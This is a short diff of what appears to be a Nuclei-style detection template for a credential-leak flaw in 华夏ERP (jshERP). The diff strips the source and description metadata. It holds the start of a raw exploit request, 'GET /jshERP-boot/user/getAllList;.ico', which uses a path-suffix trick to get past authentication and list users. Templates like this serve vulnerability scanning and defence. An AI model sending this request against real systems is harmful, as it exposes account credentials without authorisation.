@@ -3,12 +3,8 @@ info:
   name: 华夏ERP账号密码信息泄露
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oxlpl25mkrzypn1v'
+  description: ''
   tags: info-leak,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: oxlpl25mkrzypn1v
-    fofa: 暂无
 http:
 - raw:
   - 'GET /jshERP-boot/user/getAllList;.ico HTTP/1.1
